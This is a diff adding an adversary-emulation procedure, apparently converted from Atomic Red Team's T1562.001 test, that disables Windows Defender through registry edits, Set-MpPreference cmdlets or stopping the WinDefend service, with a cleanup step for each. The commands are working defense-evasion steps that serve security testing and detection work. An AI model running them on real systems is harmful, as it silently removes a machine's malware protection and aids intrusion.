@@ -1,0 +1,101 @@
+# Converted from Atomic Red Team - Impair Defenses: Disable or Modify Tools
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1562.001
+# Original auto_generated_guids: 1f6743da-6ecc-4a93-b03f-dc357e4b313f, 6b8df440-51ec-4d53-bf83-899591c9b5d7, aa875ed4-8935-47e2-b2c5-6ec00ab220d2
+
+---
+api_version: 2.0
+uuid: f87539f8-1e7e-45f9-8e91-c095eacd6df5
+name: Disable Windows Defender
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Disable Windows Defender by tampering with registry using reg.exe, using PowerShell Set-MpPreference cmdlets,
+  or by stopping the WinDefend service. Upon execution, Windows Defender protections will be disabled.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1562 Impair Defenses"
+  subtechniques:
+    - "T1562.001 Disable or Modify Tools"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: method
+    description: The method to disable Windows Defender
+    type: string
+    choices:
+    - registry
+    - powershell
+    - service
+    default: registry
+  - name: backup_location
+    description: Path where first registry backup will be saved (for registry method)
+    type: path
+    default: "C:\\Users\\Public\\backup.reg"
+steps:
+{{ if eq .Args.method "registry" }}
+  - name: backup_registry_policies
+    executor: cmd.exe
+    inline: |
+      reg export "HKLM\Software" "{{.Args.backup_location}}" /y 2>nul
+
+  - name: tamper_defender_registry_reg
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul
+      reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul
+      reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul
+      reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul
+      reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg import "{{.Args.backup_location}}" 2>nul
+{{ else if eq .Args.method "powershell" }}
+  - name: tamper_defender_atp
+    executor: powershell
+    inline: |
+      Set-MpPreference -DisableRealtimeMonitoring 1
+      Set-MpPreference -DisableBehaviorMonitoring 1
+      Set-MpPreference -DisableScriptScanning 1
+      Set-MpPreference -DisableBlockAtFirstSeen 1
+    cleanup:
+      executor: powershell
+      inline: |
+        Set-MpPreference -DisableRealtimeMonitoring 0
+        Set-MpPreference -DisableBehaviorMonitoring 0
+        Set-MpPreference -DisableScriptScanning 0
+        Set-MpPreference -DisableBlockAtFirstSeen 0
+{{ else if eq .Args.method "service" }}
+  - name: tamper_defender_cmd
+    executor: cmd.exe
+    inline: |
+      sc stop WinDefend
+      sc config WinDefend start=disabled
+      sc query WinDefend
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        sc start WinDefend >nul 2>&1
+        sc config WinDefend start=enabled >nul 2>&1
+{{ end }}
